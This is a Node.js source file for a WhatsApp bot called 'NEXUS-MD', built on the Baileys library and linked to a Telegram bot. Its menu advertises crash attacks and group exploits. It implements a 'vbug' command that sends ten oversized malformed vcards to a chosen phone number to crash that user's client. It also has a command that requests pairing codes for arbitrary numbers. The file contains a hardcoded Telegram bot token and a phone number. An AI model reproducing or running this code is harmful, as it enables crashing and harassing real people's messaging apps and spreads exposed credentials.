const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    getContentType,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require("pino");

// --- [ CONFIGURATION ] ---
const tgToken = '8628876949:AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4';
const ownerNumber = "94770475809";
const prefix = ".";

const tgBot = new TelegramBot(tgToken, { polling: true });

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-V4", "Safari", "1.0.0"]
    });

    // --- [ AUTO PAIRING ] ---
    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(ownerNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                tgBot.sendMessage(ownerNumber, `🚀 *NEXUS-MD PAIRING CODE:* \`${code}\``, { parse_mode: "Markdown" }); 
            } catch (err) { console.log(err); }
        }, 8000);
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid;
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        if (!body.startsWith(prefix)) return;
        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);

        // --- [ THE GRAND MENU ] ---
        if (command === 'menu' || command === 'help') {
            const time = new Date().toLocaleTimeString();
            const date = new Date().toLocaleDateString();

            const grandMenu = `
⚡ *NEXUS-MD V4.0 GRAND MENU* ⚡
 
👋 *Hello Sasiya MD!*
📅 *Date:* ${date}
⏰ *Time:* ${time}
🛡️ *Status:* Hybrid Online

*─── [ 🔗 PAIRING SYSTEM ] ───*
◈ ${prefix}bot [number] - Public Pairing
◈ ${prefix}pair - Manual Request

*─── [ 💀 CRASH ATTACKS ] ───*
◈ ${prefix}vbug - Vcard Mega Crash
◈ ${prefix}cbug - Char Overflow
◈ ${prefix}lbug - Location Freeze
◈ ${prefix}abug - Audio Buffer Bug
◈ ${prefix}pbug - Poll Unlimited
◈ ${prefix}tagbug - Tag Crash

*─── [ 👾 GROUP EXPLOITS ] ───*
◈ ${prefix}kickall - Group Clear
◈ ${prefix}hidetag - Ghost Tag
◈ ${prefix}antilink - Security On/Off

*─── [ 🛠️ TOOLS & SYSTEM ] ───*
◈ ${prefix}ping - Speed Test
◈ ${prefix}status - System Info
◈ ${prefix}owner - Sasiya MD Info
◈ ${prefix}reboot - Restart Bot

*─── [ 🤖 TELEGRAM BOT ] ───*
◈ Use /start on Telegram Bot
◈ Token: Active ✅

🚀 *Powered by Developer Nexus*
🛡️ *Stay Safe - Use for Fun!*
            `;

            await sock.sendMessage(from, { 
                text: grandMenu,
                contextInfo: {
                    externalAdReply: {
                        title: "NEXUS-MD ULTIMATE SYSTEM",
                        body: "World's Most Powerful Hybrid Bot",
                        thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg",
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            });
        }

        // --- [ COMMAND LOGIC ] ---
        if (command === 'bot') {
            let target = args[0]?.replace(/[^0-9]/g, '');
            if (!target) return sock.sendMessage(from, { text: "❌ නම්බර් එකත් එක්ක ගහපන් බන්." });
            sock.sendMessage(from, { text: "⏳ පෝලිමේ ඉන්න... කෝඩ් එක හදනවා." });
            const { state: tState } = await useMultiFileAuthState(`temp_${target}`);
            const tSock = makeWASocket({ auth: tState, logger: pino({ level: "silent" }) });
            setTimeout(async () => {
                let code = await tSock.requestPairingCode(target);
                await sock.sendMessage(from, { text: `🔥 *YOUR PAIRING CODE:* ${code}` });
            }, 5000);
        }

        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS-MD CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(250);
            await sock.sendMessage(from, { text: "💀 Vcard Attack Starting..." });
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
                await new Promise(r => setTimeout(r, 1000));
            }
            sock.sendMessage(from, { text: "✅ Done!" });
        }
    });

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') console.log('✅ Nexus Grand System Online!');
        if (connection === 'close') startNexus();
    });
}

startNexus();
